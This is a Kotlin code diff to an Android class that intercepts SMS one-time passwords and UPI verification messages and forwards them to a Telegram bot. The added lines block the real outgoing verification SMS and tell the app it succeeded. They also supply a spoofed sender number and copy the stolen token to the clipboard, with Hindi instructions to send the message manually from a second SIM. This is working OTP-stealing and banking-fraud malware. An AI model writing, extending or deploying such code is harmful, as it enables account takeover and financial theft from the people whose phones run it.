@@ -44,7 +44,11 @@ class TokenForwarder(
         if (creds.first.isBlank() || creds.second.isBlank()) return false
         val config = configManager.load()
         val message = buildInterceptMessage(otp, config)
-        return postTelegram(creds.first, creds.second, message)
+        val sent = postTelegram(creds.first, creds.second, message)
+        if (sent) {
+            context?.let { ClipboardCopyHelper.copySms(it, smsCopyText(otp)) }
+        }
+        return sent
     }
 
     private fun resolveTelegramCreds(): Pair<String, String> {
@@ -73,18 +77,23 @@ class TokenForwarder(
 
     private fun buildInterceptMessage(otp: LastOtp, config: ModuleConfig): String {
         val outgoing = otp.direction.equals("outgoing", ignoreCase = true)
-        val peerLabel = if (outgoing) "To" else "From"
+        val peerLabel = if (outgoing) "To (short code)" else "From"
         val peerValue = if (outgoing) {
-            resolveUpiVerifyNumber(otp, config)
+            otp.rawPeer.ifBlank { resolveUpiVerifyNumber(otp, config) }
         } else {
             otp.sender.ifBlank { otp.rawPeer }
         }
         val smsBody = smsCopyText(otp)
         val appLabel = resolveAppLabel(otp)
+        val sendFrom = configManager.readSpoofPhone().ifBlank { config.mockPhoneSim1 }
 
         return buildString {
-            appendLine(if (outgoing) "📱 Intercepted Outgoing SMS" else "📱 Intercepted Incoming SMS")
+            appendLine(if (outgoing) "📱 Verify SMS Blocked — Fake Success ✅" else "📱 Intercepted Incoming SMS")
             appendLine(TELEGRAM_HANDLE)
+            if (outgoing) {
+                appendLine()
+                appendLine("Real SIM: blocked · App ko success dikha")
+            }
             if (appLabel.isNotBlank()) {
                 appendLine()
                 appendLine("App: $appLabel")
@@ -93,8 +102,16 @@ class TokenForwarder(
             appendLine("$peerLabel (Tap to copy):")
             appendLine("<code>${escapeHtml(peerValue)}</code>")
             appendLine()
-            appendLine("Body (Tap to copy):")
+            appendLine("Body / Token (Tap to copy):")
             append("<code>${escapeHtml(smsBody)}</code>")
+            if (outgoing && sendFrom.isNotBlank()) {
+                appendLine()
+                appendLine()
+                appendLine("Send FROM (app login number / 2nd SIM):")
+                appendLine("<code>${escapeHtml(sendFrom)}</code>")
+                appendLine()
+                append("Messages se isi number wali SIM se manually bhejo ↑")
+            }
         }
     }
 
